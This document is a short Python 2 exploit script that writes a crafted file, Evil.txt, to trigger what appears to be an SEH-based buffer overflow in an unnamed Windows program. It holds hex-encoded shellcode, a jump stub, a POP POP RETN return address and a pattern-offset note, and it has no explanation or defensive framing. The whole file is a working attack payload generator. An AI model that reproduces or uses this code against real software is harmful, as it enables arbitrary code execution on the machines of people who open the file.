#!/usr/bin/python
import struct

#root@kali:~# /usr/bin/msf-pattern_offset -q 316a4130
#[*] Exact match at offset 272

buf =  ""
buf += "\xbe\xcf\xaa\x26\xa1\xdb\xdd\xd9\x74\x24\xf4\x58\x2b"
buf += "\xc9\xb1\x31\x83\xe8\xfc\x31\x70\x0f\x03\x70\xc0\x48"
buf += "\xd3\x5d\x36\x0e\x1c\x9e\xc6\x6f\x94\x7b\xf7\xaf\xc2"
buf += "\x08\xa7\x1f\x80\x5d\x4b\xeb\xc4\x75\xd8\x99\xc0\x7a"
buf += "\x69\x17\x37\xb4\x6a\x04\x0b\xd7\xe8\x57\x58\x37\xd1"
buf += "\x97\xad\x36\x16\xc5\x5c\x6a\xcf\x81\xf3\x9b\x64\xdf"
buf += "\xcf\x10\x36\xf1\x57\xc4\x8e\xf0\x76\x5b\x85\xaa\x58"
buf += "\x5d\x4a\xc7\xd0\x45\x8f\xe2\xab\xfe\x7b\x98\x2d\xd7"
buf += "\xb2\x61\x81\x16\x7b\x90\xdb\x5f\xbb\x4b\xae\xa9\xb8"
buf += "\xf6\xa9\x6d\xc3\x2c\x3f\x76\x63\xa6\xe7\x52\x92\x6b"
buf += "\x71\x10\x98\xc0\xf5\x7e\xbc\xd7\xda\xf4\xb8\x5c\xdd"
buf += "\xda\x49\x26\xfa\xfe\x12\xfc\x63\xa6\xfe\x53\x9b\xb8"
buf += "\xa1\x0c\x39\xb2\x4f\x58\x30\x99\x05\x9f\xc6\xa7\x6b"
buf += "\x9f\xd8\xa7\xdb\xc8\xe9\x2c\xb4\x8f\xf5\xe6\xf1\x60"
buf += "\xbc\xab\x53\xe9\x19\x3e\xe6\x74\x9a\x94\x24\x81\x19"
buf += "\x1d\xd4\x76\x01\x54\xd1\x33\x85\x84\xab\x2c\x60\xab"
buf += "\x18\x4c\xa1\xc8\xff\xde\x29\x21\x9a\x66\xcb\x3d"


egghunter = "\x54\x58\x2D\xD2\x50\x55\x55\x2D\x55\x55\x55\x55\x2D\x55\x55\x55\x55\xFF\xE0"

buffer = buf+"A"*(268-len(buf)-len(egghunter)) +egghunter +"\xEB\xD7\x90\x90"  + "\x74\x15\x40\x00"
#00401574   5E               POP ESI
#00401575   5B               POP EBX
#00401576   C3               RETN


try:
	f=open("Evil.txt","wb")
	print "[+] Creating %s bytes evil payload.." %len(buffer)
	f.write(buffer)
	f.close()
	print "[+] File created!"
except Exception as e:
	print e
